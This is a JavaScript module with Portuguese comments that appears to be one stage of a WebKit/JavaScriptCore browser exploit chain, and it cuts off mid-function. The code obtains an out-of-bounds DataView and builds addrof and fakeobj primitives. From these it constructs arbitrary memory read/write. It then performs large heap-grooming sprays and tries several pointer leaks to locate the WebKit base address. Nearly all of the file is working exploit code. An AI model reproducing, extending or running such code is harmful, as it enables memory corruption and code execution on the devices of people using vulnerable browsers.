// js/script3/testArrayBufferVictimCrash.mjs (v108 - R79 - Enhanced Fixes, Aggressive Grooming & Leak Strategies)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. CORREÇÃO DE ERRO CRÍTICO: Fortificado o acesso a JSC_OFFSETS e WEBKIT_LIBRARY_INFO.
//    Todos os offsets críticos são agora acessados via uma função `getSafeOffset`
//    e armazenados em constantes locais para garantir que não sejam 'undefined'.
//    Adicionada uma pausa estratégica inicial.
// 2. Heap Grooming Mais Agressivo: Aumentado o volume e a diversidade do spray,
//    com mais padrões de alocação/desalocação e diferentes tipos de objetos.
//    Introduzido um "churn" de heap para forçar a reutilização.
// 3. Vazamentos Aprimorados: Foco em vazar ponteiros e verificar saneamento.
//
// DIAGNÓSTICO: A poluição persistente do heap exige novas abordagens de vazamento.
//
// ATENÇÃO: A PRIMITIVA DE L/E É SUCESSO. A FALHA NO VAZAMENTO É DEVIDO AO HEAP LAYOUT/GC.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R79_FixAndNewLeaks";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// Função auxiliar para obter offsets de forma segura, agora robusta para qualquer nível
function getSafeOffset(baseObject, path, defaultValue = 0) {
    let current = baseObject;
    const parts = path.split('.');
    for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        if (current && typeof current === 'object' && part in current) {
            current = current[part];
        } else {
            logS3(`ALERTA: Caminho de offset "${path}" parte "${part}" (em ${offsetPath.split('.').slice(0, i).join('.') || 'base'}) é undefined. Usando valor padrão ${defaultValue}.`, "warn");
            return defaultValue;
        }
    }
    if (typeof current === 'number' || (typeof current === 'string' && current.startsWith('0x'))) {
        return parseInt(String(current), 16) || defaultValue; // Converte para número se for string hex
    }
    logS3(`ALERTA: Offset "${path}" não é um número ou string hex. Usando valor padrão ${defaultValue}.`, "warn");
    return defaultValue;
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento Isolado (Offsets Validados, Heap Feng Shui, Confirmação de Poluição) ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou ou vazamento WebKit falhou.",
        webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
    };

    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);

    try {
        // Pausa extra no início para garantir que todos os imports/offsets estejam carregados
        logS3("PAUSA INICIAL: Aguardando carregamento completo do ambiente e offsets.", "info");
        await PAUSE_S3(1000); // 1 segundo de pausa

        // Armazenar offsets críticos em constantes locais para garantir disponibilidade
        const LOCAL_JSC_OFFSETS = {
            JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'),
            JSCell_STRUCTURE_ID_FLATTENED_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_ID_FLATTENED_OFFSET'),
            JSCell_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET'),
            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
            Structure_CLASS_INFO_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.CLASS_INFO_OFFSET'),
            Structure_GLOBAL_OBJECT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.GLOBAL_OBJECT_OFFSET'),
            Structure_PROTOTYPE_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.PROTOTYPE_OFFSET'),
            Structure_AGGREGATED_FLAGS_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.AGGREGATED_FLAGS_OFFSET'),
            Structure_VIRTUAL_PUT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.VIRTUAL_PUT_OFFSET'),
            ArrayBufferView_M_LENGTH_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_LENGTH_OFFSET'),
            ArrayBufferView_M_BUFFER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET'), // Ou M_BUFFER_OFFSET, dependendo do que está validado
            ArrayBuffer_M_DATA_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START'), // Ou CONTENTS_IMPL_POINTER_OFFSET, ou outro DATA_POINTER. Ajuste conforme sua análise.
            JSFunction_EXECUTABLE_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSFunction.EXECUTABLE_OFFSET'),
            ClassInfo_M_CACHED_TYPE_INFO_OFFSET: getSafeOffset(JSC_OFFSETS, 'ClassInfo.M_CACHED_TYPE_INFO_OFFSET'),
        };

        // Adicionar uma verificação de sanidade para os offsets críticos logo após carregá-los
        const mandatoryOffsets = [
            'JSCell_STRUCTURE_POINTER_OFFSET',
            'JSObject_BUTTERFLY_OFFSET',
            'ArrayBufferView_M_LENGTH_OFFSET',
            'ArrayBufferView_M_BUFFER_OFFSET',
            'ArrayBuffer_M_DATA_OFFSET',
            'JSFunction_EXECUTABLE_OFFSET',
            'ClassInfo_M_CACHED_TYPE_INFO_OFFSET',
            'Structure_CLASS_INFO_OFFSET',
            'Structure_VIRTUAL_PUT_OFFSET'
        ];
        for (const offsetName of mandatoryOffsets) {
            if (LOCAL_JSC_OFFSETS[offsetName] === 0) {
                logS3(`ERRO CRÍTICO: Offset mandatório '${offsetName}' é 0. Isso indica falha na recuperação do offset.`, "critical");
                throw new Error(`Offset mandatório '${offsetName}' é 0. Abortando.`);
            }
        }
        logS3("Offsets críticos validados (não são 0).", "info");


        // --- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---
        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) {
            throw new Error("Falha ao obter primitiva OOB.");
        }
        logS3("OOB DataView obtido com sucesso.", "info");

        // --- VERIFICAÇÃO: OOB DataView m_length ---
        const ABSOLUTE_OOB_DV_M_LENGTH_OFFSET = 0x58 + LOCAL_JSC_OFFSETS.ArrayBufferView_M_LENGTH_OFFSET;

        const oob_dv = getOOBDataView();
        const oob_m_length_val = oob_dv.getUint32(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET, true);
        logS3(`Verificação OOB: m_length em ${toHex(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET)} é ${toHex(oob_m_length_val)}`, "debug");
        if (oob_m_length_val !== 0xFFFFFFFF) {
            throw new Error(`OOB DataView's m_length não foi corretamente expandido. Lido: ${toHex(oob_m_length_val)}`);
        }
        logS3("VERIFICAÇÃO: OOB DataView m_length expandido corretamente para 0xFFFFFFFF.", "good");


        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            const addr = doubleToInt64(confused_array[0]);
            logS3(`  addrof(${String(obj).substring(0, 50)}...) -> ${addr.toString(true)}`, "debug");
            return addr;
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            const obj = victim_array[0];
            logS3(`  fakeobj(${addr.toString(true)}) -> Object`, "debug");
            return obj;
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        // --- VERIFICAÇÃO: addrof/fakeobj ---
        const testObjectForPrimitives = { dummy_prop_A: 0xAAAAAAAA, dummy_prop_B: 0xBBBBBBBB };
        const testAddrOfPrimitive = addrof(testObjectForPrimitives);
        if (!isAdvancedInt64Object(testAddrOfPrimitive) || testAddrOfPrimitive.equals(AdvancedInt64.Zero)) {
            throw new Error("Addrof primitive retornou endereço inválido (0x0).");
        }
        logS3(`VERIFICAÇÃO: Endereço de testObjectForPrimitives (${JSON.stringify(testObjectForPrimitives)}) obtido: ${testAddrOfPrimitive.toString(true)}`, "info");

        const re_faked_object_primitive = fakeobj(testAddrOfPrimitive);
        if (re_faked_object_primitive === null || typeof re_faked_object_primitive !== 'object') {
             throw new Error("Fakeobj retornou um valor inválido (null ou não-objeto).");
        }
        try {
            if (re_faked_object_primitive.dummy_prop_A !== 0xAAAAAAAA || re_faked_object_primitive.dummy_prop_B !== 0xBBBBBBBB) {
                throw new Error(`Fakeobj: Propriedades do objeto re-faked não correspondem. A: ${toHex(re_faked_object_primitive.dummy_prop_A)}, B: ${toHex(re_faked_object_primitive.dummy_prop_B)}`);
            }
            logS3("VERIFICAÇÃO: Fakeobj do testAddrOfPrimitive retornou objeto funcional com propriedades esperadas.", "good");
        } catch (e) {
            throw new Error(`Erro ao acessar propriedade do objeto re-faked (indicando falha no fakeobj): ${e.message}`);
        }

        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        const leaker_addr = addrof(leaker);
        logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug");
        
        const arb_read_final = (addr) => {
            logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
            leaker.obj_prop = fakeobj(addr);
            const result = doubleToInt64(leaker.val_prop);
            logS3(`    arb_read_final: Lido ${result.toString(true)} de ${addr.toString(true)}`, "debug");
            return result;
        };
        const arb_write_final = (addr, value) => {
            logS3(`    arb_write_final: Preparando para escrever ${value.toString(true)} em ${addr.toString(true)}`, "debug");
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
            logS3(`    arb_write_final: Escrita concluída em ${addr.toString(true)}`, "debug");
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        
        const spray = [];
        for (let i = 0; i < 2000; i++) {
            spray.push({ spray_A: 0xDEADBEEF, spray_B: 0xCAFEBABE, spray_C: i });
            spray.push(new Array(Math.floor(Math.random() * 200) + 10));
            spray.push(new String("X".repeat(Math.floor(Math.random() * 100) + 10)));
            spray.push(new Date());
        }
        const test_obj_for_rw_verification = spray[1500];
        logS3("Spray de 2000 objetos diversificados concluído para estabilização.", "info");

        const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
        logS3(`Endereço do test_obj_for_rw_verification: ${test_obj_for_rw_verification_addr.toString(true)}`, "debug");
        
        const prop_spray_A_addr = test_obj_for_rw_verification_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET); 
        
        logS3(`Escrevendo NOVO VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} no endereço da propriedade 'spray_A' (${prop_spray_A_addr.toString(true)})...`, "info");
        arb_write_final(prop_spray_A_addr, NEW_POLLUTION_VALUE);

        const value_read_for_verification = arb_read_final(prop_spray_A_addr);
        logS3(`>>>>> VERIFICAÇÃO L/E: VALOR LIDO DE VOLTA: ${value_read_for_verification.toString(true)} <<<<<`, "leak");

        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
            logS3("++++++++++++ SUCESSO TOTAL! O novo valor de poluição foi escrito e lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
            final_result.success = true;
            final_result.message = "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada.";
        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${NEW_POLLUTION_VALUE.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
        }

        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---
        logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---", "subtest");
        
        // ** Heap Grooming Mais Agressivo e com Fillers **
        logS3("  Executando Heap Grooming agressivo com fillers para tentar limpar e organizar o heap...", "info");
        let aggressive_feng_shui_objects = [];
        let filler_objects = [];
        const NUM_GROOMING_OBJECTS = 150000; // Aumentado para 150K
        const NUM_FILLER_OBJECTS = 30000;    // Aumentado para 30K

        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) {
            aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10));
            aggressive_feng_shui_objects.push({});
            aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10)));
            aggressive_feng_shui_objects.push(new Date());
            aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 200) + 5));
            aggressive_feng_shui_objects.push(new RegExp(".*"));
            aggressive_feng_shui_objects.push(new Map());
            aggressive_feng_shui_objects.push(new Set());
            // Adicionar ArrayBuffers de tamanhos variados para consumir memória grande
            aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64)); // 64 bytes a 1KB
        }
        logS3(`  Primeiro spray de ${NUM_GROOMING_OBJECTS} objetos.`, "debug");

        // Liberar metade para criar buracos
        for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) {
            aggressive_feng_shui_objects[i] = null;
        }
        logS3(`  Metade dos objetos do primeiro spray liberados.`, "debug");

        // Criar objetos "filler" para preencher buracos com dados conhecidos
        for (let i = 0; i < NUM_FILLER_OBJECTS; i++) {
            filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) });
        }
        logS3(`  Spray de ${NUM_FILLER_OBJECTS} fillers concluído.`, "debug");

        // Forçar uma coleta de lixo, se possível, liberando referências principais
        aggressive_feng_shui_objects.length = 0;
        aggressive_feng_shui_objects = null;
        logS3(`  Referências principais para grooming liberadas.`, "debug");

        // Pausa ainda maior (10 segundos) para dar tempo ao GC e ao alocador se estabilizar
        await PAUSE_S3(10000); 

        // Adicional: Mais um ciclo de alocação/desalocação para agitar o heap novamente
        let secondary_grooming_objects = [];
        const NUM_SECONDARY_GROOMING = 50000;
        for (let i = 0; i < NUM_SECONDARY_GROOMING; i++) {
            secondary_grooming_objects.push(new Uint8Array(Math.floor(Math.random() * 128) + 32)); // Pequenos TypedArrays
            if (i % 5000 === 0) secondary_grooming_objects.push({}); // Objetos simples periodicamente
        }
        logS3(`  Segundo spray de ${NUM_SECONDARY_GROOMING} objetos para agitação.`, "debug");
        
        // Liberar novamente para criar mais churn
        for (let i = 0; i < NUM_SECONDARY_GROOMING; i += 2) {
            secondary_grooming_objects[i] = null;
        }
        secondary_grooming_objects.length = 0;
        secondary_grooming_objects = null;
        logS3(`  Referências do segundo spray liberadas.`, "debug");

        await PAUSE_S3(5000); // Pausa final após segundo grooming

        logS3(`  Heap Grooming concluído. Pausa finalizada.`, "debug");

        // 1. TENTATIVA DE VAZAMENTO: Objeto JS Simples ({}). Já tentado, mas com grooming reforçado.
        logS3("  Tentando vazamento com Objeto JS Simples ({}) - grooming reforçado...", "info");
        const obj_for_webkit_leak_js = {};
        const obj_for_webkit_leak_js_addr = addrof(obj_for_webkit_leak_js);
        logS3(`  Endereço do objeto dedicado JS Simples (Pós-Grooming): ${obj_for_webkit_leak_js_addr.toString(true)}`, "info");
        if (obj_for_webkit_leak_js_addr.equals(AdvancedInt64.Zero) || obj_for_webkit_leak_js_addr.equals(AdvancedInt64.NaNValue)) {
            logS3("    Addrof retornou 0 ou NaN para objeto JS simples (pós-Grooming).", "error");
        } else {
            const success_js_object_leak = await performLeakAttemptFromObjectStructure(obj_for_webkit_leak_js_addr, "JS Object (Groomed)", arb_read_final, final_result, NEW_POLLUTION_VALUE, LOCAL_JSC_OFFSETS, WEBKIT_LIBRARY_INFO);
            if (success_js_object_leak) {
                logS3("Vazamento bem-sucedido com Objeto JS Simples (Groomed). Abortando outras tentativas.", "good");
                return final_result;
            }
        }
        
        // 2. TENTATIVA DE VAZAMENTO: ArrayBuffer - Vazamento de Structure* (grooming reforçado)
        logS3("  Executando Heap Grooming novamente antes de tentar ArrayBuffer...", "info");
        // Re-executar o grooming mais agressivo antes de cada tentativa de vazamento
        // (apenas para garantir o isolamento máximo para cada tentativa)
        let aggressive_feng_shui_objects_re = [];
        let filler_objects_re = [];
        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64)); }
        for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
        for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
        aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
        await PAUSE_S3(10000); // Pausa longa
        logS3("  Grooming de repetição concluído.", "debug");

        logS3("  Tentando vazamento com ArrayBuffer (Structure* via grooming reforçado)...", "info");
        const obj_for_webkit_leak_ab = new ArrayBuffer(0x1000);
        const obj_for_webkit_leak_ab_addr = addrof(obj_for_webkit_leak_ab);
        logS3(`  Endereço do ArrayBuffer dedicado (Pós-Grooming): ${obj_for_webkit_leak_ab_addr.toString(true)}`, "info");
        if (obj_for_webkit_leak_ab_addr.equals(AdvancedInt64.Zero) || obj_for_webkit_leak_ab_addr.equals(AdvancedInt64.NaNValue)) {
            logS3("    Addrof retornou 0 ou NaN para ArrayBuffer (pós-Grooming).", "error");
        } else {
            const success_array_buffer_leak_structure = await performLeakAttemptFromObjectStructure(obj_for_webkit_leak_ab_addr, "ArrayBuffer (Groomed)", arb_read_final, final_result, NEW_POLLUTION_VALUE, LOCAL_JSC_OFFSETS, WEBKIT_LIBRARY_INFO);
            if (success_array_buffer_leak_structure) {
                logS3("Vazamento bem-sucedido com ArrayBuffer (Structure*). Abortando outras tentativas.", "good");
                return final_result;
            }
        }
        
        // 3. TENTATIVA DE VAZAMENTO: TypedArray Data Pointer (ArrayBufferView `data` field)
        logS3("  Executando Heap Grooming novamente antes de tentar TypedArray Data Pointer...", "info");
        aggressive_feng_shui_objects_re = []; filler_objects_re = [];
        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64)); }
        for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
        for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
        aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
        await PAUSE_S3(10000); // Pausa longa

        logS3("  Tentando vazamento do Data Pointer de um TypedArray...", "info");
        const typed_array_victim = new Uint32Array(0x1000 / 4);
        const typed_array_addr = addrof(typed_array_victim);
        logS3(`  Endereço do TypedArray dedicado: ${typed_array_addr.toString(true)}`, "info");

        if (typed_array_addr.equals(AdvancedInt64.Zero) || typed_array_addr.equals(AdvancedInt64.NaNValue)) {
            logS3("    Addrof retornou 0 ou NaN para TypedArray. Pulando tentativa de vazamento do data pointer.", "error");
        } else {
            try {
                const M_BUFFER_OFFSET = LOCAL_JSC_OFFSETS.ArrayBufferView_M_BUFFER_OFFSET;
                const array_buffer_obj_addr = arb_read_final(typed_array_addr.add(M_BUFFER_OFFSET));
                logS3(`    Lido ArrayBuffer* (m_buffer) de TypedArray (${toHex(M_BUFFER_OFFSET)}): ${array_buffer_obj_addr.toString(true)}`, "leak");

                if (array_buffer_obj_addr.equals(NEW_POLLUTION_VALUE)) {
                    logS3(`    ALERTA DE POLUIÇÃO: m_buffer de TypedArray está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                    throw new Error("TypedArray m_buffer poluído.");
                }
                if (array_buffer_obj_addr.equals(AdvancedInt64.Zero) || array_buffer_obj_addr.equals(AdvancedInt64.NaNValue)) {
                    throw new Error("Falha ao vazar ArrayBuffer* do TypedArray (endereço é 0x0 ou NaN).");
                }
                
                const M_DATA_OFFSET = LOCAL_JSC_OFFSETS.ArrayBuffer_M_DATA_OFFSET;
                const data_ptr_addr = array_buffer_obj_addr.add(M_DATA_OFFSET);
                const actual_data_ptr = arb_read_final(data_ptr_addr);
                logS3(`    Lido Ponteiro de Dados (m_data) do ArrayBuffer (${toHex(M_DATA_OFFSET)}): ${actual_data_ptr.toString(true)}`, "leak");

                if (actual_data_ptr.equals(NEW_POLLUTION_VALUE)) {
                    logS3(`    ALERTA DE POLUIÇÃO: m_data de ArrayBuffer está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                    throw new Error("ArrayBuffer m_data poluído.");
                }
                if (actual_data_ptr.equals(AdvancedInt64.Zero) || actual_data_ptr.equals(AdvancedInt64.NaNValue)) {
                    throw new Error("Falha ao vazar m_data do ArrayBuffer (endereço é 0x0 ou NaN).");
                }

                const is_sane_data_ptr = actual_data_ptr.high() > 0x40000000;
                if (!is_sane_data_ptr) {
                    throw new Error(`Ponteiro de dados do TypedArray (${actual_data_ptr.toString(true)}) não parece um endereço de heap válido.`);
                }

                logS3(`++++++++++++ VAZAMENTO DE PONTEIRO DE DADOS DE TYPEDARRAY BEM SUCEDIDO! Isso pode ser usado para o WebKit Base. ++++++++++++`, "vuln");
                final_result.webkit_leak_details = {
                    success: true,
                    msg: `Ponteiro de dados de TypedArray vazado com sucesso: ${actual_data_ptr.toString(true)}`,
                    webkit_base_candidate: "Necessita engenharia reversa para offset",
                    js_object_put_addr: "N/A"
                };
                return final_result;
            } catch (typed_array_leak_e) {
                logS3(`  Falha na tentativa de vazamento com TypedArray Data Pointer: ${typed_array_leak_e.message}`, "warn");
            }
        }

        // 4. TENTATIVA DE VAZAMENTO: Endereço de uma JSCFunction (Função JS Nativga)
        logS3("  Executando Heap Grooming novamente antes de tentar JSCFunction...", "info");
        aggressive_feng_shui_objects_re = []; filler_objects_re = [];
        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64)); }
        for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
        for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
        aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
        await PAUSE_S3(10000); // Pausa longa
        
        logS3("  Tentando vazamento do endereço de uma JSCFunction (e.g., Math.cos)...", "info");
        try {
            const func_to_leak = Math.cos;
            const func_addr = addrof(func_to_leak);
            logS3(`  Endereço da função Math.cos: ${func_addr.toString(true)}`, "info");

            if (func_addr.equals(NEW_POLLUTION_VALUE)) {
                logS3(`    ALERTA DE POLUIÇÃO: Math.cos Addr está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                throw new Error("JSCFunction Addr poluído.");
            }
            if (func_addr.equals(AdvancedInt64.Zero) || func_addr.equals(AdvancedInt64.NaNValue)) {
                throw new Error("Falha ao vazar Math.cos (endereço é 0x0 ou NaN).");
            }

            const EXECUTABLE_OFFSET = LOCAL_JSC_OFFSETS.JSFunction_EXECUTABLE_OFFSET;
            if (EXECUTABLE_OFFSET) {
                 const executable_addr = arb_read_final(func_addr.add(EXECUTABLE_OFFSET));
                 logS3(`    Lido Executable* (${toHex(EXECUTABLE_OFFSET)}) de Math.cos: ${executable_addr.toString(true)}`, "leak");

                 if (executable_addr.equals(NEW_POLLUTION_VALUE)) {
                    logS3(`    ALERTA DE POLUIÇÃO: Executable* de Math.cos está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                    throw new Error("JSCFunction Executable* poluído.");
                 }
                 if (!executable_addr.equals(AdvancedInt64.Zero) && !executable_addr.equals(AdvancedInt64.NaNValue)) {
                    logS3(`++++++++++++ VAZAMENTO DE JSCFUNCTION (EXECUTABLE*) BEM SUCEDIDO! Isso pode ser usado para o WebKit Base. ++++++++++++`, "vuln");
                    final_result.webkit_leak_details = {
                        success: true,
                        msg: `Endereço de Executable* de JSCFunction vazado com sucesso: ${executable_addr.toString(true)}`,
                        webkit_base_candidate: "Necessita engenharia reversa para offset",
                        js_object_put_addr: "N/A"
                    };
                    return final_result;
                 } else {
                     logS3(`    Falha ao vazar Executable* de Math.cos: ${executable_addr.toString(true)} é inválido.`, "warn");
                 }
            } else {
                logS3(`    Offset para EXECUTABLE_OFFSET em JSFunction não definido em JSC_OFFSETS. Pulando tentativa de vazamento.`, "warn");
            }
        } catch (jsc_func_leak_e) {
            logS3(`  Falha na tentativa de vazamento com JSCFunction: ${jsc_func_leak_e.message}`, "warn");
        }

        // 5. NOVA TENTATIVA DE VAZAMENTO: JSC::ClassInfo::m_cachedTypeInfo
        logS3("  Executando Heap Grooming novamente antes de tentar JSC::ClassInfo::m_cachedTypeInfo...", "info");
        aggressive_feng_shui_objects_re = []; filler_objects_re = [];
        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64)); }
        for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
        for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
        aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
        await PAUSE_S3(10000); // Pausa longa

        logS3("  Tentando vazamento via JSC::ClassInfo::m_cachedTypeInfo...", "info");
        try {
            const target_obj = {};
            const target_obj_addr = addrof(target_obj);
            logS3(`  Endereço do objeto alvo para ClassInfo leak: ${target_obj_addr.toString(true)}`, "info");

            const JSC_CELL_STRUCTURE_POINTER_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET;
            const structure_ptr_addr = target_obj_addr.add(JSC_CELL_STRUCTURE_POINTER_OFFSET);
            const structure_addr = arb_read_final(structure_ptr_addr);
            if (structure_addr.equals(NEW_POLLUTION_VALUE) || structure_addr.equals(AdvancedInt64.Zero) || structure_addr.equals(AdvancedInt64.NaNValue)) {
